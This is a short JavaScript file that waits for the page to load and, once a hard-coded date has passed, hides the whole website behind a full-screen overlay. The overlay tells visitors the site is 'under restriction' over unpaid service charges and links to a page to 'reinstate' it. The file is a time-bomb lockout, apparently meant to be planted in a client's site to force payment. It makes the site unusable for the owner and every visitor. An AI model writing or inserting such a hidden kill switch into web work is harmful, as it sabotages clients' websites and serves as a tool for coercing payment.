document.addEventListener("DOMContentLoaded", function () {
  // Define the target date (format: YYYY-MM-DD)
  var targetDate = new Date("2024-07-08T00:00:00");

  var currentDate = new Date();

  targetDate.setHours(0, 0, 0, 0);
  currentDate.setHours(0, 0, 0, 0);

  if (currentDate.getTime() >= targetDate.getTime()) {
    var style = document.createElement("style");
    style.innerHTML = `
      body {
        overflow: hidden; 
      }

      body * {
      }

      #restriction-overlay {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000814;
        z-index: 9999;
        text-align: center;
        padding: 20px;
      }

      #restriction-overlay p {
        font-size: 2em;
        color: #ffd60a;
        margin-bottom: 20px;
      }

      #restriction-overlay a {
        font-size: 1.5em;
        color: #000000;
        background-color: #ffff3f;
        padding: 10px 20px;
        border-radius: 5px;
        text-decoration: none;
        display: inline-block;
        transition: background-color 0.3s;
      }

      #restriction-overlay a:hover {
        background-color: #ffee32;
      }

      @media only screen and (max-width: 600px) {
        #restriction-overlay p {
          font-size: 1.5em;
        }

        #restriction-overlay a {
          font-size: 1.2em;
        }
      }
    `;
    document.head.appendChild(style);

    var restrictionOverlay = document.createElement("div");
    restrictionOverlay.id = "restriction-overlay";
    restrictionOverlay.innerHTML = `
      <p>💀 Your website is under restriction because you have not paid the complete service charges as per deal. Please make your payment now, and we will reinstate your website.!</p>
      <a href="https://example.com" target="_blank">Reinstate your Website Now...!</a>
    `;
    document.body.appendChild(restrictionOverlay);
  }
});
